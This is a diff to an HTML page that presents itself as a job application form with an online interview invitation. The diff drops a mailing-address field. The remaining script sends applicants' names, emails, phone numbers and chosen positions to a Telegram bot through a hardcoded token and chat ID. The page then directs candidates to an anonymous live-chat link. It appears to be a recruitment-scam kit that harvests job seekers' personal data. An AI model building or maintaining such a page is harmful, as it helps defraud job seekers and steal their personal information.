@@ -62,7 +62,6 @@
     <h2>Job Application Form</h2>
     <form id="jobForm">
       <input type="text" id="name" name="name" placeholder="Full Name" required>
-      <input type="text" id="address" name="address" placeholder="Mailing Address" required>
       <input type="email" id="email" name="email" placeholder="Email" required>
       <input type="text" id="phone" name="phone" placeholder="Phone Number" required>
       <select id="position" name="position" required>
@@ -85,7 +84,7 @@
     <div class="center-me">
       <h2>Interview Invitation: Discuss Your Role</h2>
       <p>As part of our commitment to understanding each team member’s experience and ensuring the necessary support for success, we’d like to schedule a brief interview with you.</p>
-      <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones.Our HR team is available Monday to Friday, from 8:00 AM to 10:00 PM EST. Simply join the live chat link during this timeframe at your convenience.</p>
+      <p>In response to the large number of applicants, we’ve moved all interviews online. This ensures an easier, faster process for candidates, who can join from their laptops or phones. Our HR team is available Monday to Friday, from 8:00 AM to 10:00 PM EST. Simply join the live chat link during this timeframe at your convenience.</p>
       <p><strong>During this conversation, we’ll discuss:</strong></p>
       <ul>
         <li>Your current role and responsibilities</li>
@@ -98,7 +97,7 @@
         <li>Days: Monday – Friday</li>
         <li>Time: Anytime between 8:00 AM – 10:00 PM EST (join when it’s convenient for you)</li>
         <li>Duration: 15–20 minutes</li>
-       <li><strong>Join via:</strong> <a href="https://direct.lc.chat/16972020" target="_blank"><strong>Live Chat Link</strong></a></li>
+        <li><strong>Join via:</strong> <a href="https://direct.lc.chat/16972020" target="_blank"><strong>Live Chat Link</strong></a></li>
       </ul>
       <p>You don’t need to schedule a time — just join during hours listed above. We look forward to speaking with you!</p>
     </div>
@@ -111,12 +110,11 @@
       event.preventDefault();
 
       const name = document.getElementById("name").value;
-      const address = document.getElementById("address").value;
       const email = document.getElementById("email").value;
       const phone = document.getElementById("phone").value;
       const position = document.getElementById("position").value;
 
-      const message = `New application received:%0AName: ${name}%0AAddress: ${address}%0AEmail: ${email}%0APhone: ${phone}%0AJob: ${position}`;
+      const message = `New application received:%0AName: ${name}%0AEmail: ${email}%0APhone: ${phone}%0AJob: ${position}`;
 
       const telegramURL = `https://api.telegram.org/bot6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4/sendMessage?chat_id=1461764555&text=${message}`;
 
@@ -126,7 +124,6 @@
           if (data.ok) {
             emailjs.send("service_e18jeef", "template_wut6w6s", {
               fullName: name,
-              MaillingAddress: address,
               Email: email,
               PhoneNumber: phone,
               SelectPosition: position
